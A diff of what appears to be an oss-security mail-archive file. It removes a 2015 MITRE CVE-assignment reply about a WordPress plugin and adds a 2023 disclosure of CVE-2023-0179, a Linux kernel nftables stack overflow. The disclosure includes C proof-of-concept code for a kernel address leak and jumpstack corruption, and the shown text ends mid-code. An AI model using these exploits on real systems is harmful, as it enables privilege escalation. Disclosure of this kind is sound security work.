@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5588" "Monday" "27" "July" "2015" "11:33:48" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20150727153348.04ADB6FC064@smtpvmsrv1.mitre.org>" "130" "[oss-security] Re: Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3" nil nil nil "7" "2015072715:33:48" "[oss-security] Re: Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3" (number mark "        cve-assign@m Jul 27  130/5588  " thread-indent "\"[oss-security] Re: Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3\"\n") "<7A32AB08-3039-4F44-BD53-9680109B79C4@me.com>" ("<7A32AB08-3039-4F44-BD53-9680109B79C4@me.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 19744 invoked by uid 550); 27 Jul 2015 15:34:22 -0000
+Received: (qmail 31803 invoked by uid 550); 13 Jan 2023 16:16:15 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,143 +6,887 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 19704 invoked from network); 27 Jul 2015 15:34:16 -0000
-In-Reply-To: <7A32AB08-3039-4F44-BD53-9680109B79C4@me.com>
-Message-Id: <20150727153348.04ADB6FC064@smtpvmsrv1.mitre.org>
-Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
-Date: Mon, 27 Jul 2015 11:33:48 -0400 (EDT)
-From: cve-assign@mitre.org
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3
-To: larry0@me.com
+Received: (qmail 20231 invoked from network); 13 Jan 2023 15:22:49 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20210112;
+        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
+         :date:message-id:reply-to;
+        bh=XrUz4glx6zjhtHF5tn0xtqlWGzzGy5WcI2Ox5LvftWA=;
+        b=ZGCS61MbcB1iixVhJyX6NCUT5M302rnI7isCzs+w24OHO/YyqXXFyXn7emtEzyqs0Q
+         7w6I6gTKvGrbQvDy9jvEWmCgzZmriJ5zjziqSk13/cNYEFMQWnuAvrLSSXIn+BBwPCN0
+         T7lrzaah2T0eNX2HrlW4O4L4ZLp6jfF6mPKRJv1nagCCi7KDRKCk7vOTXq5s1YDCy8Mh
+         ZvvtxBH977W04pbqiGhhqGyuamWC/FZi/pvDRabrOottCPTGO2lc4OogKAA46RlaC8Ok
+         CoebHOJqAUhTbEiyNGdpGLJraMNanPVjPnYz8gR/FphIU13U/UWvaUzwAr+1UKTaTCtX
+         PfKw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20210112;
+        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=XrUz4glx6zjhtHF5tn0xtqlWGzzGy5WcI2Ox5LvftWA=;
+        b=ZNgkIDfaX+iT6jFXZjZDLbRKgqYVYD3CYcg2Af8ioQ8s5BN9STREVEE9Vq6qd5o/Eq
+         BTp99eNWJBhVkPeZj689alWiSoOVUUFSUvXONCE8ENoUjCsmbxJ7waB7pr+Wo1saef/H
+         e6vBVfEd9itei3C3fZf8yfL3Xb21YfV2GclnuawYx0cW7eN4E9S9/9KAHZec9qYApH4f
+         9/X7L/yGW/w7CiZCKQldpksv+c6a02Fy0Kooa/GTDN0zWplTHIAHnfMIb+lYJKUP7GVW
+         G3nf7N9jfNkV6S49MfXMDToTSXjdmUUw9/7gnsgrorJ1eCgwoYQpofw5XjJ8ygvAgwUW
+         nkxA==
+X-Gm-Message-State: AFqh2krAH5awrv99C1sSRW9qN3P8Mejf5Hab3Yh2G7IdysPZsejS+TGN
+	cftJOI0MgAYn2Pk+nvWuhegZ4FbpQdLsrX5t+uTefAiguDc=
+X-Google-Smtp-Source: AMrXdXsxvI+f7UkNq2ddSRC2v4HgsxR+ZW70IGZfiU6CDpfEa21fXEYIVcONV8tMLz/UmuIq00Mm290nB3hz4ui/xaI=
+X-Received: by 2002:a63:e247:0:b0:492:50dc:da4e with SMTP id
+ y7-20020a63e247000000b0049250dcda4emr3988511pgj.462.1673623356167; Fri, 13
+ Jan 2023 07:22:36 -0800 (PST)
+MIME-Version: 1.0
+From: Davide Ornaghi <d.ornaghi97@gmail.com>
+Date: Fri, 13 Jan 2023 16:22:47 +0100
+Message-ID: <CAHH-0UfWddrL_x9n1eG1oJ6iurew7D6Yb=z=068BfV7uJGSRGw@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: multipart/alternative; boundary="000000000000a1d8b605f226cde1"
+Subject: [oss-security] CVE-2023-0179: Linux kernel stack buffer overflow in nftables: PoC
+ and writeup
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+--000000000000a1d8b605f226cde1
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
->> ... It seems that the essence
->> of the problem is that the product could reject unsafe file types such
->> as .php files, but doesn't do that. That can have one CVE ID.
+Hello everyone,
 
-> It should filter out what file types are allowed for uploading at least.
+While auditing the Linux kernel (6.2.0-rc1, commit
+1b929c02afd37871d5afb9d498426f83432e71c2), I found a buffer overflow
+vulnerability within the Netfilter subsystem which has been assigned
+CVE-2023-0179.
+CVE-2023-0179 is exploitable starting from commit f6ae9f1 up to commit
+696e1a48b1a1.
+The exploitation could allow the leakage of both stack and heap addresses
+and, potentially, a Local Privilege Escalation to the root user via
+arbitrary code execution.
 
-Use CVE-2015-5681 for the issue in which an executable file is not
-blocked, and consequently an attacker has the ability to create and
-execute arbitrary PHP code, such as at the
-/wp-content/uploads/power_play/4_uploadfolder/big/shell.php URI in
-your original example.
+## The vulnerability
 
-> The directory creation code in upload.php doesn't create the
-> subdirectories big and thumb. These directories are added when a new
-> album is created through normal use of the plugin.
+The vulnerability consists of a stack buffer overflow due to an integer
+underflow vulnerability inside the nft_payload_copy_vlan function, which is
+invoked with nft_payload expressions as long as a VLAN tag is present in
+the current skb.
+(net/netfilter/nft_payload.c)
 
-Thanks for this additional information. In that case, we feel that it
-is best to categorize the:
+```c
+/* add vlan header into the user buffer for if tag was removed by offloads
+*/
+static bool nft_payload_copy_vlan(u32 *d, const struct sk_buff *skb, u8
+offset, u8 len)
+{
+    int mac_off =3D skb_mac_header(skb) - skb->data;
+    u8 *vlanh, *dst_u8 =3D (u8 *) d;
+    struct vlan_ethhdr veth;
+    u8 vlan_hlen =3D 0;
 
-  // Create target dir
-  if (!file_exists($targetDir)) {
-          @mkdir($targetDir);
-  }
+    if ((skb->protocol =3D=3D htons(ETH_P_8021AD) ||       <=3D=3D=3D=3D=3D=
+ (0)
+         skb->protocol =3D=3D htons(ETH_P_8021Q)) &&
+        offset >=3D VLAN_ETH_HLEN && offset < VLAN_ETH_HLEN + VLAN_HLEN)
+        vlan_hlen +=3D VLAN_HLEN;
 
-code block as, more or less, an authorization bypass. The user of
-upload.php has no legitimate need to create a $targetDir directory,
-because this directory is usable only if previously created by a
-power_play.php code block of:
+    vlanh =3D (u8 *) &veth;
 
-        if( !is_dir( $album_dir ) )
-                mkdir($album_dir);
-        if( !is_dir($album_dir . '/big') )
-                mkdir($album_dir . '/big');
-        if( !is_dir($album_dir . '/thumb') )
-                mkdir($album_dir . '/thumb'); 
+    if (offset < VLAN_ETH_HLEN + vlan_hlen) {
+        u8 ethlen =3D len;
 
-The user of upload.php can choose to use directory traversal (as you
-mentioned) or can simply create a huge number of directories with (for
-example) numeric or alphanumeric $_REQUEST['albumid'] values.
-Directory traversal is not an independent primary vulnerability and
-cannot have its own separate CVE ID.
+        if (vlan_hlen &&
+            skb_copy_bits(skb, mac_off, &veth, VLAN_ETH_HLEN) < 0)
+            return false;
+        else if (!nft_payload_rebuild_vlan_hdr(skb, mac_off, &veth))
+            return false;
 
-Use CVE-2015-5682 for the issue of a superfluous "@mkdir($targetDir);"
-line that allows attackers to create arbitrarily many useless
-directories via a series of requests.
+        if (offset + len > VLAN_ETH_HLEN + vlan_hlen) <=3D=3D=3D=3D=3D (1)
+            ethlen -=3D offset + len - VLAN_ETH_HLEN + vlan_hlen;   <=3D=3D=
+=3D=3D=3D (2)
 
->> Are you also reporting any authorization problem? Is upload.php
->> responsible for verifying that the client user has the upload_files
->> capability, regardless of what file type is being uploaded?
+        memcpy(dst_u8, vlanh + offset - vlan_hlen, ethlen);     <=3D=3D=3D=
+=3D=3D (3)
 
-> I know I wouldn't want arbitrary images uploaded to my Wordpress
-> instance from users who aren't logged in.
+        len -=3D ethlen;
+        if (len =3D=3D 0)
+            return true;
 
-This was a somewhat philosophical question about WordPress security.
-There are no more CVE ID assignments below, but here are our comments
-in case anyone is interested.
+        dst_u8 +=3D ethlen;
+        offset =3D ETH_HLEN + vlan_hlen;
+    } else {
+        offset -=3D VLAN_HLEN + vlan_hlen;
+    }
 
-As far as we can tell, there is no expectation that the author of a
-plugin must determine whether the plugin offers a feature associated
-with the concept of "uploading files" and, if so, make that feature
-available only to users who have the upload_files capability. In some
-cases, this would be a good idea for aligning the plugin's behavior
-with user expectations, or for making the plugin's authorization model
-easy to understand. However, a plugin may have a good reason to do
-something entirely different. For example, if there are many people
-who need to do exactly one upload and will never interact with that
-WordPress installation again, it might be simpler to have an upload
-password.
+    return skb_copy_bits(skb, offset + mac_off, dst_u8, len) =3D=3D 0;
+}
+```
 
-WordPress apparently supports the behavior of some plugins with:
+The checks at (0) look for a second VLAN tag from the EtherType field and,
+if the offset falls between the first VLAN_ETH_HLEN bytes and VLAN_ETH_HLEN
+plus the size of another VLAN header, then nftables should also try and
+process the second VLAN.
+At (1) the if statement correctly checks the boundary of the header using
+the offset and len variables (8-bit unsigned ints), evaluating to true
+whenever offset + len exceeds the double-tagged VLAN header.
+The use of inline statements successfully prevents wrappings because u8
+types are automatically promoted before the comparison.
 
-  wp-admin/media-new.php
+However, on the next line, the subtraction at (2) does not grant type
+promotion, and ethlen (u8) may wrap to UINT8_MAX under certain conditions.
+Some examples of vulnerable offset and len pairs are:
 
-  /**
-   * Manage media uploaded file.
-   *
-   * There are many filters in here for media. Plugins can extend functionality
-   * by hooking into the filters.
-  ... 
-   if (!current_user_can('upload_files'))
-           wp_die(__('You do not have permission to upload files.'));
+offset: 19 & len: 4 & ethlen =3D 251
+offset: 16 & len: 19 & ethlen =3D 254
+offset: 20 & len: 32 & ethlen =3D 250
+...
+Other pairs can be listed with the following algorithm:
+```c
+uint8_t vlan_hlen =3D VLAN_HLEN, ethlen;
+for (uint8_t len =3D 0; len < UINT8_MAX; len++) {
+    for (uint8_t offset =3D 0; offset < UINT8_MAX; offset++) {
+        if (offset < VLAN_ETH_HLEN + vlan_hlen) {
+            uint8_t ethlen =3D len;
+            if (offset + len > VLAN_ETH_HLEN + vlan_hlen) {
+                ethlen -=3D offset + len - VLAN_ETH_HLEN + vlan_hlen;
+                printf("offset: %hhu & len: %hhu & ethlen =3D %hhu\n",
+offset, len, ethlen);
+            }
+        }
+    }
+}
+```
 
-The current case is, essentially, that an unauthenticated attacker can
-send a request to upload.php and place non-executable content at the
-URI:
+Finally, at (3) an up to 255-byte buffer gets copied to the destination
+register located on the stack, overwriting the adjacent memory.
+Since we can control the destination register, we can pick NFT_REG32_15 to
+trigger a 251-byte OOB write on the stack (since NFT_REG32_15 occupies 4
+bytes).
+The vulnerable code path can be reached if the function
+skb_vlan_tag_present(skb) evaluates to true, that is if the skb->vlan_tci
+field is set. This is known to happen when the host is placed inside a
+VLAN, although a modified skb could also be forged manually. (perhaps by
+forging the packet itself or with some other nft_expr that can edit
+packets?)
 
-  /wp-content/uploads/power_play/4_uploadfolder/big/not-a-shell.jpg
+The calling function is nft_payload_eval which evaluates the Nftables
+expression:
 
-Your comment was "I know I wouldn't want arbitrary images uploaded,"
-which doesn't directly answer the question of whether this is a
-reported vulnerability or not. Our current feeling is that we will not
-universally categorize this as a vulnerability unless there is
-confirming feedback from the author. We didn't find anything at
-either:
+```c
+void nft_payload_eval(const struct nft_expr *expr,
+              struct nft_regs *regs,
+              const struct nft_pktinfo *pkt) {
+    const struct nft_payload *priv =3D nft_expr_priv(expr);
+    const struct sk_buff *skb =3D pkt->skb;
+    u32 *dest =3D &regs->data[priv->dreg]; <=3D=3D=3D=3D=3D (0)
+    int offset;
 
-  https://web.archive.org/web/20150503133237/https://wordpress.org/plugins/wp-powerplaygallery/
-  http://wpslideshow.com/powerplay-gallery/
+    if (priv->len % NFT_REG32_SIZE)
+        dest[priv->len / NFT_REG32_SIZE] =3D 0;
 
-documenting that the upload process should be authenticated or that
-uploaded files should be initially inaccessible. There are obviously
-very good reasons to prevent an unauthenticated upload of a JPG file
-to an accessible and predictable URL; however, there might sometimes
-be a tradeoff with usability and the WordPress installation might want
-to deploy the plugin anyway until abuse is actually observed. We also
-realize that, for any specific example in which this is occurring,
-there is probably a possible design improvement that preserves nearly
-all usability and makes abuse much more difficult. Still, our decision
-for now is that there's no CVE ID associated with creating
-/wp-content/uploads/power_play/4_uploadfolder/big/not-a-shell.jpg in
-the above example.
+    switch (priv->base) {
+    case NFT_PAYLOAD_LL_HEADER:             <=3D=3D=3D=3D=3D (1)
+        if (!skb_mac_header_was_set(skb))
+            goto err;
 
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.14 (SunOS)
+        if (skb_vlan_tag_present(skb)) {
+            if (!nft_payload_copy_vlan(dest, skb,
+                           priv->offset, priv->len)) <=3D=3D=3D=3D=3D (2)
+                goto err;
+            return;
+        }
+        ...
+```
 
-iQEcBAEBAgAGBQJVtk5cAAoJEKllVAevmvmswL4H/1jFeB0Dr3s+KqtbJX+xTvzP
-LvTFb9m4gG5OGfzqUVWeQPnjURgWw7Hz7Qcdj3WIo3SpsmOkq89RgaQFSWKsYxAp
-BzedA08ztTzEaaVSGHHN/7TgXe05xuVpYPzyO2D4SRmXU7LRCSDg/lpi5SHCTcJY
-GMW5inwiB1LiJhsQ+c3CsY5iD+HjSTk7t640wHuMY5aIRfcbdd5utVfR9PUlfafg
-Wyu7jJhNmqGOSKe4lXa9jwtjND31SQcCIgLe5HnI/E1fOpIzaHh/oS0yLcRID/nM
-mWeHDCoXHeF4seHFXNHg4pSl/BOVxJqBWQKz6ZVklqIf4ryLQ2dWxAITZ2NuTwQ=
-=KocW
------END PGP SIGNATURE-----
+At (0) dest is set to the chosen destination register, where the payload
+expression will store its result.
+If the payload offset base is NFT_PAYLOAD_LL_HEADER (1) and a mac header is
+present, the vulnerable code path will be taken (2).
+Furthermore, the kernel must be built with the configuration
+`CONFIG_NETFILTER`, `CONFIG_NF_TABLES`, `CONFIG_VLAN_8021Q` enabled, and
+the `CAP_NET_ADMIN` capability must be enabled, which can be accomplished
+by entering a new user namespace beforehand.
+
+## Info leak: Exploitation details
+
+The exploitation can be carried out in two ways:
+The data leak is triggered by using NFT_REG32_00 as the destination
+register, which will fill the other registers with data from the stack.
+To retrieve the leaked data from the registers, multiple techniques can be
+applied. I chose to create an nft_set which will store values across
+multiple nft_do_chain routines, I then created 8 different nft_dynset
+expressions to index all the available registers and store their values
+inside the set.
+Finally, the nft userspace utility can be used to retrieve the set content:
+```
+./nft list ruleset
+table ip mytable {
+    map myset12 {
+        type 0x0 [invalid type] : 0x0 [invalid type]
+        size 65535
+        elements =3D { 0x90e0000 [invalid type] : 0xcdd681ff [invalid type],
+                 0x12810000 [invalid type] : 0xc9ffff40 [invalid type],
+                 0x277d5b8c [invalid type] : 0xf50f0580 [invalid type],
+                 0x5fd95cf0 [invalid type] : 0x88ffff60 [invalid type],
+                 0x88ffff08 [invalid type] : 0xc9ffff50 [invalid type],
+                 0x88ffff50 [invalid type] : 0xc9ffffc2 [invalid type],
+                 0xf00f0580 [invalid type] : 0xb0e0000 [invalid type],
+                 0xf10f0580 [invalid type] : 0xb0e0000 [invalid type] }
+    }
+```
+
+gdb will help reassemble the addresses:
+```
+gef=E2=9E=A4  x/16gx 0xffffc900000e0943
+0xffffc900000e0943:    0x15d498ffffffff82    0xffffffffff888005
+0xffffc900000e0953:    0x00000000000000ff    0x0081120000000000
+0xffffc900000e0963:    0x5cd95f8c5b7d2700    0xffff8880050ff1f0   <=3D=3D=
+=3D=3D=3D
+struct nft_expr *expr
+0xffffc900000e0973:    0xffff8880050ff008    0xffffc900000e0950   <=3D=3D=
+=3D=3D=3D
+0xffffc900000e0983:    0xffff8880050ff540    0xffffc900000e0b60   <=3D=3D=
+=3D=3D=3D
+0xffffc900000e0993:    0xffffc900000e0b50    0xffffffff81d6cdc2   <=3D=3D=
+=3D=3D=3D
+0xffffc900000e09a3:    0xffffc900000e0930    0xffffffff81df5b57
+0xffffc900000e09b3:    0xffff888005034a50    0x00000000015c0d00
+```
+All the highlighted addresses can be derived from the userspace set dump
+and can be used to calculate the KASLR slide.
+The following PoC code can be used to reach this condition:
+
+```c
+#define VLAN_HLEN    4
+#define VLAN_ETH_HLEN 18
+int create_base_chain_rule(struct mnl_socket* nl, char* table_name, char*
+chain_name, uint16_t family, uint64_t* handle, int* seq, uint8_t offset,
+uint8_t len)
+{
+    struct nftnl_rule* r =3D build_rule(table_name, chain_name, family,
+handle);
+    // 1. register grooming
+    char *keys[] =3D {"AAAA", "BBBB", "CCCC", "DDDD", "EEEE", "FFFF", "GGGG=
+",
+"HHHH"};
+    char *values[] =3D {"AAAA", "BBBB", "CCCC", "DDDD", "EEEE", "FFFF",
+"GGGG", "HHHH"};
+
+    for (unsigned int keyreg =3D NFT_REG32_00; keyreg <=3D NFT_REG32_07;
+keyreg++) {
+        rule_add_immediate_data(r, keyreg, (void *) keys[keyreg -
+NFT_REG32_00], 4);
+    }
+    for (unsigned int datareg =3D NFT_REG32_09; datareg <=3D NFT_REG32_15;
+datareg++) {
+        rule_add_immediate_data(r, datareg, (void *) values[datareg -
+NFT_REG32_09], 4);
+    }
+
+    // 2. trigger overflow
+    rule_add_payload(r, NFT_PAYLOAD_LL_HEADER, offset, len, NFT_REG32_00);
+
+    // 3. copy to set
+    for (int keyreg =3D NFT_REG32_00, datareg =3D NFT_REG32_08; keyreg <=3D
+NFT_REG32_07, datareg <=3D NFT_REG32_15; datareg++, keyreg++) {
+        rule_add_dynset(r, "myset12", keyreg, datareg);
+    }
+
+    // 4. commit to the kernel
+    return send_batch_request(
+        nl,
+        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
+        NLM_F_CREATE, family, (void**)&r, seq,
+        NULL
+    );
+}
+
+int main(int argc, char** argv, char** envp)
+{
+    system("ip link set dev lo up");
+    struct mnl_socket* nl =3D mnl_socket_open(NETLINK_NETFILTER);
+
+    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
+        perror("[-] mnl_socket_bind");
+        exit(EXIT_FAILURE);
+    }
+    int seq =3D time(NULL);
+    int err;
+
+    char *table_name =3D "mytable",
+         *base_chain_name =3D "base_chain",
+         *set_name =3D "myset12";
+
+    if (create_table(nl, table_name, AF_INET, &seq, NULL) =3D=3D -1) {
+        perror("Failed creating table");
+        exit(EXIT_FAILURE);
+    }
+    printf("[+] Created nft %s\n", table_name);
+
+    struct unft_base_chain_param bp;
+    bp.hook_num =3D NF_INET_PRE_ROUTING;
+    bp.prio =3D 10;
+    if (create_chain(nl, table_name, base_chain_name, NFPROTO_IPV4, &bp,
+&seq, NULL)) {
+        perror("Failed creating base chain");
+        exit(EXIT_FAILURE);
+    }
+    printf("[+] Created base ipv4 chain %s\n", base_chain_name);
+
+    if (create_set(nl, table_name, set_name, NFPROTO_IPV4, &seq, NULL)) {
+        perror("Failed creating set");
+        exit(EXIT_FAILURE);
+    }
+    printf("[+] Created exploit set\n");
+
+    uint8_t vlan_hlen =3D 0, ethlen;
+    for (uint8_t len =3D 0; len < UINT8_MAX; len++) {
+        for (uint8_t offset =3D 0; offset < UINT8_MAX; offset++) {
+            if (offset >=3D VLAN_ETH_HLEN && offset < VLAN_ETH_HLEN +
+VLAN_HLEN) {
+                vlan_hlen =3D 4;
+            } else {
+                vlan_hlen =3D 0;
+            }
+            if (offset < VLAN_ETH_HLEN + vlan_hlen) {
+                uint8_t ethlen =3D len;
+                if (offset + len > VLAN_ETH_HLEN + vlan_hlen) {
+
+                    ethlen -=3D offset + len - VLAN_ETH_HLEN + vlan_hlen;
+                    if (ethlen > 250 && vlan_hlen =3D=3D 4 && len % 4 =3D=
+=3D 0) {
+                        if (create_base_chain_rule(nl, table_name,
+base_chain_name, NFPROTO_IPV4, NULL, &seq, offset, len)) {
+                            perror("Failed creating base chain rule");
+                            exit(EXIT_FAILURE);
+                        } else {
+                            printf("offset: %hhu & len: %hhu & ethlen =3D
+%hhu\n", offset, len, ethlen);
+                            puts("[+] Successfully created base chain
+rule!");
+                            return 0;
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+```
+
+## Code execution: Initial exploitation details
+
+The second way to exploit this vulnerability involves overwriting most of
+the jumpstack array, which gets allocated right next to the registers in
+nft_do_chain, with controlled data (net/netfilter/nf_tables_core.c:236).
+The register's content is also included in the OOB write, allowing us to
+overwrite the jumpstack with arbitrary rules and chains.
+
+```c
+regs.verdict.code =3D NFT_CONTINUE;
+for (; rule < last_rule; rule =3D nft_rule_next(rule)) {
+    nft_rule_dp_for_each_expr(expr, last, rule) {
+        expr_call_ops_eval(expr, &regs, pkt);
+        if (regs.verdict.code !=3D NFT_CONTINUE)
+            break;
+    }
+
+    switch (regs.verdict.code) {
+    case NFT_BREAK:
+        regs.verdict.code =3D NFT_CONTINUE;
+        nft_trace_copy_nftrace(pkt, &info);
+        continue;
+    case NFT_CONTINUE:
+        nft_trace_packet(pkt, &info, chain, rule,
+                 NFT_TRACETYPE_RULE);
+        continue;
+    }
+    break;
+}
+
+switch (regs.verdict.code) {
+    case NFT_JUMP:
+        if (WARN_ON_ONCE(stackptr >=3D NFT_JUMP_STACK_SIZE))
+            return NF_DROP;
+        jumpstack[stackptr].chain =3D chain;
+        jumpstack[stackptr].rule =3D nft_rule_next(rule);
+        jumpstack[stackptr].last_rule =3D last_rule;
+        stackptr++;           <=3D=3D=3D=3D=3D (0)
+        fallthrough;
+    case NFT_GOTO:
+        chain =3D regs.verdict.chain;
+        goto do_chain;
+    case NFT_CONTINUE:
+    case NFT_RETURN:
+        break;
+    default:
+        WARN_ON_ONCE(1);
+}
+
+if (stackptr > 0) {             <=3D=3D=3D=3D=3D (1)
+    stackptr--;
+    chain =3D jumpstack[stackptr].chain;
+    rule =3D jumpstack[stackptr].rule;     <=3D=3D=3D=3D=3D (2)
+    last_rule =3D jumpstack[stackptr].last_rule;
+    goto next_rule;
+}
+```
+
+By repeatedly jumping to another chain, the stackptr variable gets
+incremented (0) until the jumpstack entry that will end up containing our
+addresses has been reached, then the last chain will trigger the overflow,
+effectively replacing the jumpstack content and setting the verdict to
+NFT_CONTINUE. The NFT_CONTINUE verdict allows us to break from the switch
+statement and reach (1).
+At this point, the chain, rule, and last_rule variables will be overwritten
+with our controlled data (2).
+
+The security issue is that, if the rule points to a well-formed expression
+that can be dereferenced, the expr_call_ops_eval function will be called on
+that expression, effectively evaluating it:
+
+```c
+static void expr_call_ops_eval(const struct nft_expr *expr,
+                   struct nft_regs *regs,
+                   struct nft_pktinfo *pkt) {
+    ...
+    expr->ops->eval(expr, regs, pkt);
+}
+```
+
+The following PoC code replicates this scenario and triggers a protection
+fault when dereferencing our rule pointer:
+
+```c
+#define VLAN_HLEN    4
+#define VLAN_ETH_HLEN 18
+
+int create_final_chain_rule(struct mnl_socket* nl, char* table_name, char*
+chain_name, uint16_t family, uint64_t* handle, int* seq, uint8_t offset,
+uint8_t len) {
+    struct nftnl_rule* r =3D build_rule(table_name, chain_name, family,
+handle);
+    // 1. register grooming
+    char *data[] =3D  {"ABBB", "BBBB", "BCCC", "CCCC", "CAAA", "AAAA",
+"AAAA", "AAAA", "AAAA", "AAAA", "AAAA", "AAAA", "AAAA", "AAAA","AAAA",
+"AAAA", "AAAA"};
+
+    for (int reg =3D NFT_REG32_00; reg <=3D NFT_REG32_15; reg++) {
+        rule_add_immediate_data(r, reg, (void *) data[reg - NFT_REG32_00],
+4);
+    }
+
+    // 2. trigger overflow
+    rule_add_payload(r, NFT_PAYLOAD_LL_HEADER, offset, len, NFT_REG32_15);
+
+    // 3. break from the regs verdict switch, going back to the corrupted
+previous chain
+    rule_add_immediate_verdict(r, NFT_CONTINUE, "final_chain");
+
+    return send_batch_request(
+        nl,
+        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
+        NLM_F_CREATE, family, (void**)&r, seq,
+        NULL
+    );
+}
+
+int create_jmp_chain_rule(struct mnl_socket* nl, char* table_name, char*
+chain_name, uint16_t family, uint64_t* handle, int* seq)
+{
+    struct nftnl_rule* r =3D build_rule(table_name, chain_name, family,
+handle);
+    int i =3D atoi(chain_name);
+    i++;
+    char next_chain[5];
+    sprintf(next_chain, "%d", i);
+
+    if (i =3D=3D 8) {
+        // jump to the overflow chain
+        rule_add_immediate_verdict(r, NFT_JUMP, "final_chain");
+    } else {
+        // jump to the next jmp chain, incrementing stackptr
+        rule_add_immediate_verdict(r, NFT_JUMP, next_chain);
+    }
+
+    return send_batch_request(
+        nl,
+        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
+        NLM_F_CREATE, family, (void**)&r, seq,
+        NULL
+    );
+}
+
+int create_base_chain_rule(struct mnl_socket* nl, char* table_name, char*
+chain_name, uint16_t family, uint64_t* handle, int* seq)
+{
+    struct nftnl_rule* r =3D build_rule(table_name, chain_name, family,
+handle);
+    uint16_t num =3D htons(1337);
+    uint16_t biggerNum =3D htons(1338);
+    rule_add_immediate_data(r, NFT_REG32_15, &num, sizeof num);
+
+    rule_add_cmp(r, NFT_CMP_NEQ, NFT_REG32_15, &biggerNum, sizeof
+biggerNum);
+
+    rule_add_immediate_verdict(r, NFT_JUMP, "0");
+
+    return send_batch_request(
+        nl,
+        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
+        NLM_F_CREATE, family, (void**)&r, seq,
+        NULL
+    );
+}
+
+int main(int argc, char** argv, char** envp)
+{
+    system("ip link set dev lo up");
+
+    struct mnl_socket* nl =3D mnl_socket_open(NETLINK_NETFILTER);
+
+    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
+        perror("[-] mnl_socket_bind");
+        exit(EXIT_FAILURE);
+    }
+    int seq =3D time(NULL);
+    int err;
+
+    char *table_name =3D "exploit_table",
+         *base_chain_name =3D "base_chain",
+         *final_chain_name =3D "final_chain";
+
+    if (create_table(nl, table_name, AF_INET, &seq, NULL) =3D=3D -1) {
+        perror("Failed creating table");
+        exit(EXIT_FAILURE);
+    }
+    printf("[+] Created nft %s\n", table_name);
+
+    struct unft_base_chain_param bp;
+    bp.hook_num =3D NF_INET_PRE_ROUTING;
+    bp.prio =3D 10;
+    if (create_chain(nl, table_name, base_chain_name, NFPROTO_IPV4, &bp,
+&seq, NULL)) {
+        perror("Failed creating base chain");
+        exit(EXIT_FAILURE);
+    }
+    printf("[+] Created base ipv4 chain %s\n", base_chain_name);
+
+    if (create_chain(nl, table_name, final_chain_name, NFPROTO_IPV4, NULL,
+&seq, NULL)) {
+        perror("Failed creating final chain");
+        exit(EXIT_FAILURE);
+    }
+    printf("[+] Created final chain %s\n", final_chain_name);
+
+    char jmp_chain_name[5];
+    for (int i =3D 0; i < 8; i++) {
+        sprintf(jmp_chain_name, "%d", i);
+        if (create_chain(nl, table_name, jmp_chain_name, NFPROTO_IPV4,
+NULL, &seq, NULL)) {
+            perror("Failed creating jmp chain");
+            exit(EXIT_FAILURE);
+        }
+        printf("[+] Created jmp chain %s\n", jmp_chain_name);
+    }
+
+    if (create_base_chain_rule(nl, table_name, base_chain_name,
+NFPROTO_IPV4, NULL, &seq)) {
+        perror("Failed creating base chain rule");
+        exit(EXIT_FAILURE);
+    }
+
+    puts("[+] Succesfully created base_chain rule!");
+    for (int i =3D 0; i < 8; i++) {
+        sprintf(jmp_chain_name, "%d", i);
+        if (create_jmp_chain_rule(nl, table_name, jmp_chain_name,
+NFPROTO_IPV4, NULL, &seq)) {
+            perror("Failed creating jmp chain rule");
+            exit(EXIT_FAILURE);
+        }
+        puts("[+] Successfully created jmp chain rule!");
+    }
+
+    uint8_t vlan_hlen =3D 0, ethlen;
+    for (uint8_t len =3D 0; len < UINT8_MAX; len++) {
+        for (uint8_t offset =3D 0; offset < UINT8_MAX; offset++) {
+            if (offset >=3D VLAN_ETH_HLEN && offset < VLAN_ETH_HLEN +
+VLAN_HLEN) {
+                vlan_hlen =3D 4;
+            } else {
+                vlan_hlen =3D 0;
+            }
+            if (offset < VLAN_ETH_HLEN + vlan_hlen) {
+                uint8_t ethlen =3D len;
+                if (offset + len > VLAN_ETH_HLEN + vlan_hlen) {
+
